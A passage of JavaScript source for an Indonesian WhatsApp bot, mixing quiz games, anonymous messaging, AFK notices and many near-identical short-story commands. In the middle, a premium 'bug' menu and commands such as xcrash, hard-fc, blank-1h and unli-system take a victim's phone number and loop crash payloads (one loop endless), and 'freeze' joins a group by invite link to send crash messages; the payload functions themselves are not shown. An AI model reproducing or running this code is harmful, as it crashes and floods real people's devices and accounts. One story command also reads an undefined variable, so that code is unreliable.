            tebakkata,
            kuismath,
            susunkata,
            tebakkimia,
            caklontong,
            tebakangka,
            tebaknegara,
            tebakgambar,
            tebakbendera
        }
        for (let gameName in games) {
            let game = games[gameName];
            let id = iGame(game, m.chat);
            if (m.quoted && id == m.quoted.id) {
                if (gameName == 'kuismath') {
                    jawaban = game[m.chat + id].jawaban
                    const difficultyMap = {
                        'noob': 1,
                        'easy': 1.5,
                        'medium': 2.5,
                        'hard': 4,
                        'extreme': 5,
                        'impossible': 6,
                        'impossible2': 7
                    };
                    let randMoney = difficultyMap[kuismath[m.chat + id].mode]
                    if (!isNaN(budy)) {
                        if (budy.toLowerCase() == jawaban) {
                            db.users[m.sender].uang += randMoney * 1000
                            await m.reply(`Jawaban Benar 🎉\nBonus Uang 💰 *+${randMoney * 1000}*`, {
                                quoted: fkontak1
                            })
                            delete kuismath[m.chat + id]
                        } else Replyx('*Jawaban Salah!*')
                    }
                } else {
                    jawaban = game[m.chat + id].jawaban
                    let jawabBenar = /tekateki|tebaklirik|tebaklagu|tebakkata|tebaknegara|tebakbendera/.test(gameName) ? (similarity(budy.toLowerCase(), jawaban) >= almost) : (budy.toLowerCase() == jawaban)
                    let bonus = gameName == 'caklontong' ? 9999 : gameName == 'tebaklirik' ? 4299 : gameName == 'susunkata' ? 2989 : 3499
                    if (jawabBenar) {
                        db.users[m.sender].uang += bonus * 1
                        await m.reply(`Jawaban Benar 🎉\nBonus Uang 💰 *+${bonus}*`, {
                            quoted: fkontak1
                        })
                        delete game[m.chat + id]
                    } else Replyx('*Jawaban Salah!*')
                }
            }
        }

        // Family 100
        if (m.chat in family100) {
            if (m.quoted && m.quoted.id == family100[m.chat].id && !isCmd) {
                let room = family100[m.chat]
                let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
                let isSurender = /^((me)?nyerah|surr?ender)$/i.test(teks)
                if (!isSurender) {
                    let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                    if (room.terjawab[index]) return !0
                    room.terjawab[index] = m.sender
                }
                let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
                let caption = `Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}\n${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}\n${Array.from(room.jawaban, (jawaban, index) => { return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false }).filter(v => v).join('\n')}\n${isSurender ? '' : `Perfect Player`}`.trim()
                m.reply(caption)
                if (isWin || isSurender) delete family100[m.chat]
            }
        }

        // Menfes
        if (!m.isGroup) {
            if (menfes[m.sender] && m.key.remoteJid !== 'status@broadcast') {
                if (!/^del(menfe(s|ss)|confe(s|ss))$/i.test(command)) {
                    m.msg.contextInfo = {
                        isForwarded: true,
                        forwardingScore: 1,
                        quotedMessage: {
                            conversation: `*Pesan Dari ${menfes[m.sender].nama ? menfes[m.sender].nama : 'Seseorang'}*`
                        },
                        key: {
                            remoteJid: '0@s.whatsapp.net',
                            fromMe: false,
                            participant: '0@s.whatsapp.net'
                        }
                    }
                    const pesan = m.type === 'conversation' ? {
                        extendedTextMessage: {
                            text: m.msg,
                            contextInfo: {
                                isForwarded: true,
                                forwardingScore: 1,
                                quotedMessage: {
                                    conversation: `*Pesan Dari ${menfes[m.sender].nama ? menfes[m.sender].nama : 'Seseorang'}*`
                                },
                                key: {
                                    remoteJid: '0@s.whatsapp.net',
                                    fromMe: false,
                                    participant: '0@s.whatsapp.net'
                                }
                            }
                        }
                    } : {
                        [m.type]: m.msg
                    }
                    await Xlesy.relayMessage(menfes[m.sender].tujuan, pesan, {});
                }
            }
        }

        // Afk
        let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
        for (let jid of mentionUser) {
            let user = db.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`Jangan tag dia!\nDia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}\nSelama ${clockString(new Date - afkTime)}`.trim(), {
                quoted: fkontak1
            })
        }
        if (db.users[m.sender].afkTime > -1) {
            let user = db.users[m.sender]
            m.reply(`@${m.sender.split('@')[0]} berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}\nSelama ${clockString(new Date - user.afkTime)}`, {
                quoted: fkontak1
            })
            user.afkTime = -1
            user.afkReason = ''
        }
        //add case

        switch (command) {    
case 'xlesybug':
case 'bugxlesy':
case 'bug': {
    if (!isPremium) return Replyx(mess.prem)
    if (!q) return Replyx(`Example: ${prefix + command} 62×××|linkgc|idgc`, { quoted: fkontak1 })
    Replyx(mess.load)

    let nomor = q.split('|')[0]?.replace(/\D/g, '')
    if (!nomor || !nomor.startsWith('62')) return Replyx('format salah Contoh: 628XXX')

    let imagePath = './lib/media/image/XlesyBug.jpg'

    let textMessage = `
*╭── ⧼ \`XLESYVIP MODE BUG\` ⧽*
*│ 々 Creator  : ${author}*
*│ 々 OwnerNumber : ${owner}*
*│ 々 BotName : ${botname}*
*│ 々 VersiOn  : ${require('./package.json').version}*
*│ 々 TypeSc  : Cjs*
*│ 々 Runtime  : ${runtime(process.uptime())}*
*╰────────────────⧽*

⧼ Please Subs Dev \`XLESYVIP\` ⧽
[https://youtube.com/@Gxyenn]

> ⧼ Pilih Tombol Di Bawah Untuk Jenis Bug ⧽
`

    let buttons = [
        {
            buttonId: ".owner",
            buttonText: { displayText: "所有者" },
            type: 1
        },
        {
            buttonId: ".ping",
            buttonText: { displayText: "サーバ" },
            type: 1
        },
        {
            buttonId: "yy " + nomor,
            buttonText: { displayText: "List Bug" },
            type: 1,
            nativeFlowInfo: {
                name: "single_select",
                paramsJson: JSON.stringify({
                    title: "SLECT BUG",
                    sections: [
                        {
                            title: "FITUR XLESYVIP BUG",
                            rows: [
                                { id: ".trash-fc " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ꜰᴄ", description: "trash fc XLESYVIP" },
                                { id: ".xcrash " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ᴄʀᴀꜱʜ", description: "x crash XLESYVIP" },
                                { id: ".xbug-fc " + nomor, title: "xʟᴇꜱʏᴠɪᴘ xꜰᴄ", description: "xbug fc XLESYVIP" },
                                { id: ".crasher " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ᴄʀᴀꜱʜ", description: "crasher XLESYVIP" },
                                { id: ".hard-fc " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ʜꜰᴄ", description: "hard fc XLESYVIP" },
                                { id: ".uixfc " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ᴜꜰᴄ", description: "ui x fc XLESYVIP" },
                                { id: ".hard-ui " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ʜᴜɪ", description: "hard ui XLESYVIP" },
                                { id: ".xblank " + nomor, title: "xʟᴇꜱʏᴠɪᴘ xʙʟᴀɴᴋ", description: "xblank XLESYVIP" },
                                { id: ".Xlesy-hard " + nomor, title: "xʟᴇꜱʏᴠɪᴘ xʟᴇꜱʏ-ʜᴀʀᴅ", description: "xlesy hard XLESYVIP" },
                                { id: ".blank-1h " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ʙʟᴀɴᴋᴅᴀʏ", description: "blank 1hari XLESYVIP" },
                                { id: ".bugfc-unli " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ꜰᴄ-ᴜɴʟɪ", description: "bug fc unli XLESYVIP" },
                                { id: ".bugui-unli " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ᴜɪ-ᴜɴʟɪ", description: "bug ui unli XLESYVIP" },
                                { id: ".unli-system " + nomor, title: "xʟᴇꜱʏᴠɪᴘ ꜱʏꜱᴛᴍᴜɴʟɪ", description: "unli system XLESYVIP" }
                            ]
                        },
                        {
                            title: "FITUR BUG GC",
                            rows: [{
                                id: ".freeze " + nomor,
                                title: "xʟᴇꜱʏᴠɪᴘ ꜰʀᴇᴢᴢ",
                                description: "Freeze XLESYVIP "
                            }]
                        }
                    ]
                })
            }
        }
    ];

    await Xlesy.sendButtonMsg(m.chat, {
        image: {
            url: imagePath
        },
        text: textMessage,
        footer: 'XLESYVIP',
        buttons: buttons,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363405649403674@newsletter",
                newsletterName: `スクリプト更新情報`
            },
            externalAdReply: {
                title: m.pushName,
                body: packname,
                showAdAttribution: true,
                thumbnailUrl: fake.gandathumburl,
                mediaType: 1,
                previewType: 0,
                renderLargerThumbnail: false,
                mediaUrl: my.gh,
                sourceUrl: my.gh,
            }
        }
    }, {
        quoted: ftroli
    })
}
break
            case 'githubtrend': {
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '🔍',
                        key: m.key
                    }
                })
               try {
                    let anu = 'https://api.agungny.my.id/api/ghtrending';
                    let response = await fetch(anu);
                    let data = await response.json();

                    if (!data || !data.result || data.result.length === 0) {
                        return Replyx('Gagal mengambil data GitHub Trending!');
                    }

                    let hasil = '*🔥 GitHub Trending 🔥*\n\n';
                    data.result.slice(0, 5).forEach((repo, i) => {
                        hasil += `*${i + 1}. ${repo.name}*\n`;
                        hasil += `📌 Deskripsi: ${repo.description || 'Tidak ada deskripsi'}\n`;
                        hasil += `⭐ Stars: ${repo.stars}\n`;
                        hasil += `🍴 Forks: ${repo.forks}\n`;
                        hasil += `👤 Author: ${repo.author}\n`;
                        hasil += `🔗 URL: ${repo.url}\n\n`;
                    })

                    m.reply(hasil, {
                        quoted: fkontak1
                    })
                } catch (e) {
                    console.error(e);
                    Replyx('Terjadi kesalahan saat mengambil data GitHub Trending!', {
                        quoted: fkontak1
                    })
                }
            }
            break;
            
            //bug case
case 'trash-fc':
case 'xcrash': {
if (!isPremium) return Replyx(mess.prem)
if (!q) return Replyx(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(bugres)
for (let i = 0; i < 20; i++) {
await DocBug(target)
await LocaBugs(target)
await InvisibleLoadFast(target)
await InvisiPayload(target)
await MSGSPAM1(target)
await DocFc(target)
await NewIos(target, Ptcp = true)
await invc2(target, ptcp = true)
await OverloadCursor(target, ptcp = true)
}
m.reply(`Suscesfully attack to ${target}✅`, { quoted: fkontak1 })
}
break

case 'xbug-fc':
case 'crasher': {
if (!isPremium) return Replyx(mess.prem)
if (!q) return Replyx(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(bugres)
for (let i = 0; i < 20; i++) {
await InvisibleLoadFast(target)
await InvisiPayload(target)
await MSGSPAM1(target)
await DocFc(target)
await NewIos(target, Ptcp = true)
await invc2(target, ptcp = true)
await OverloadCursor(target, ptcp = true)
}
m.reply(`Suscesfully attack to ${target}✅`, { quoted: fkontak1 })
}
break

case 'hard-fc': {
if (!isPremium) return Replyx(mess.prem)
if (!q) return Replyx(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(bugres)
for (let i = 0; i < 20; i++) {
await InvisibleLoadFast(target)
await InvisiPayload(target)
await MSGSPAM1(target)
await DocFc(target) 
await NewIos(target, Ptcp = true)
await invc2(target, ptcp = true)
await OverloadCursor(target, ptcp = true)
}
m.reply(`Suscesfully attack to ${target}✅`, { quoted: fkontak1 })
}
break

case 'uixfc': {
if (!isPremium) return Replyx(mess.prem)
if (!q) return Replyx(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(bugres)
for (let i = 0; i < 20; i++) {
await DocBug(target)
await LocaBugs(target)
await InvisibleLoadFast(target)
await InvisiPayload(target)
await MSGSPAM1(target)
await DocFc(target)
await NewIos(target, Ptcp = true)
await invc2(target, ptcp = true)
await OverloadCursor(target, ptcp = true)
}
m.reply(`Suscesfully attack to ${target}✅`, { quoted: fkontak1 })
}
break

case 'xlesy-hard':
case 'hard-ui':
case 'xblank': 
case 'blank-1h': {
if (!isPremium) return Replyx(mess.prem)
if (!q) return Replyx(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(bugres)
for (let i = 0; i < 30; i++) {
await InvisibleLoadFast(target)
await InvisiPayload(target)
await MSGSPAM1(target)
await DocFc(target)
await NewIos(target, Ptcp = true)
await invc2(target, ptcp = true)
await OverloadCursor(target, ptcp = true)
await f10(target, Ptcp = true);
await func1(target)
await ngeloc(target)
await killui(target)
await ngeloc(target)
await Bug2(target)
await DocBug(target)
await LocaBugs(target)
await crashX(target)
await aipong(target)
await iponcrash(target)
await IosMJ(target, Ptcp = true)
await crashbeta(target, ptcp = true)
await crashui2(target, { ptcp: true })
await BlankScreen(target, { ptcp: true })
await XeonXRobust(target, { ptcp: true })
await freezefile(target, { ptcp: true })
await IosMJ(target, true)
await LocSystem(target)
await XiosVirus(target)
await QDIphone(target)
await QPayIos(target)
await QPayStriep(target)
await FBiphone(target)
await VenCrash(target)
await AppXCrash(target)
await SmCrash(target)
await SqCrash(target)
await IosMJ(target, true)
await XiosVirus(target)
}
m.reply(`Suscesfully attack to ${target}✅`, { quoted: fkontak1 })
}
break

case 'bugfc-unli':
case 'bugui-unli':
case 'unli-system': {
if (!isPremium) return Replyx(mess.prem)
if (!q) return Replyx(`Example: ${prefix + command} 62×××`, { quoted: fkontak1 })
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
m.reply(bugres)
for (let i = 0; true; i++) {
await DocBug(target)
await LocaBugs(target)
await InvisibleLoadFast(target)
await InvisiPayload(target)
await MSGSPAM1(target)
await DocFc(target)
await NewIos(target, Ptcp = true)
await invc2(target, ptcp = true)
await OverloadCursor(target, ptcp = true)
}
m.reply(`Suscesfully attack to ${target}✅`, { quoted: fkontak1 })
}
break
            case 'freeze': {
                if (!isPremium) return Replyx(mess.prem)               
                if (!q) return Replyx(`Wrong Usage.\nExample : ${prefix + command} https://chat.whatsapp.com/xxxxxx atau ${prefix + command} 123456789@g.us`, {
                    quoted: fkontak1
                });

                let groupId;

                // Cek apakah input berupa link grup atau langsung ID grup
                if (q.includes("https://chat.whatsapp.com/")) {
                    let result = q.split("https://chat.whatsapp.com/")[1];
                    groupId = await Xlesy.groupAcceptInvite(result); // Join grup dan ambil ID grup
                } else {
                    groupId = q; // Jika input langsung berupa ID grup
                }

                // Ambil info grup untuk cek apakah grup sedang di-mute
                let groupMetadata = await Xlesy.groupMetadata(groupId);
                if (groupMetadata.announce) { // Jika announce = true, berarti grup sedang di-mute
                    return Replyx("❌ Gagal! Bot tidak bisa mengirim pesan karena grup sedang di-mute oleh admin.", {
                        quoted: fkontak1
                    });
                }

                await sleep(1000);
                Replyx(`Success send bug to ${groupId}`, {
                    quoted: fkontak1
                });

                // Kirim bug beberapa kali ke grup yang ditargetkan
                await Carousel(groupId);
                await Carousel(groupId);
                await Carousel(groupId);
            }
            break;



            //cerpen
            case 'cerpen-anak': {
                let hasil = await cerpen(`anak`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-bahasadaerah': {
                let hasil = await cerpen(`bahasa daerah`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-bahasainggris': {
                let hasil = await cerpen(`bahasa Inggris`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-bahasajawa': {
                let hasil = await cerpen(`bahasa jawa`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-bahasasunda': {
                let hasil = await cerpen(`bahasa sunda`, {
                    quoted: fkontak1
                })
                m.reply(`
 ❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-budaya': {
                let hasil = await cerpen(`budaya`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-cinta': {
                let hasil = await cerpen(`cinta`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-cintaislami': {
                let hasil = await cerpen(`cinta islami`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-cintapertama': {
                let hasil = await cerpen(`cinta pertama`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-cintaromantis': {
                let hasil = await cerpen(`cinta romantis`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-cintasedih': {
                let hasil = await cerpen(`cinta sedih`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-cintasegitiga': {
                let hasil = await cerpen(`Cinta segitiga`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-cintasejati': {
                let hasil = await cerpen(`cinta sejati`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-galau': {
                let hasil = await cerpen(`galau`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-gokil': {
                let hasil = await cerpen(`gokil`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-inspiratif': {
                let hasil = await cerpen(`inspiratif`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-jepang': {
                let hasil = await cerpen(`jepang`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-kehidupan': {
                let hasil = await cerpen(`kehidupan`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-keluarga': {
                let hasil = await cerpen(`keluarga`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-kisahnyata': {
                let hasil = await cerpen(`kisah nyata`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-korea': {
                let hasil = await cerpen(`korea`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-kristen': {
                let hasil = await cerpen(`kristen`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-liburan': {
                let hasil = await cerpen(`liburan`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-malaysia': {
                let hasil = await cerpen(`malaysia`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-mengharukan': {
                let hasil = await cerpen(`mengharukan`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-misteri': {
                let hasil = await cerpen(`misteri`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-motivasi': {
                let hasil = await cerpen(`motivasi`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-nasihat': {
                let hasil = await cerpen(`nasihat`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-nasionalisme': {
                let hasil = await cerpen(`nasionalisme`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-olahraga': {
                let hasil = await cerpen(`olahraga`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-patahhati': {
                let cerpe = await cerpen(`patah hati`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-penantian': {
                let hasil = await cerpen(`penantian`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-pendidikan': {
                let hasil = await cerpen(`pendidikan`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-pengalaman': {
                let hasil = await cerpen(`pengalaman pribadi`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-pengorbanan': {
                let hasil = await cerpen(`pengorbanan`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-penyesalan': {
                let hasil = await cerpen(`penyesalan`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-perjuangan': {
                let hasil = await cerpen(`perjuangan`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-perpisahan': {
                let hasil = await cerpen(`perpisahan`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-persahabatan': {
                let hasil = await cerpen(`persahabatan`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-petualangan': {
                let hasil = await cerpen(`petualangan`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
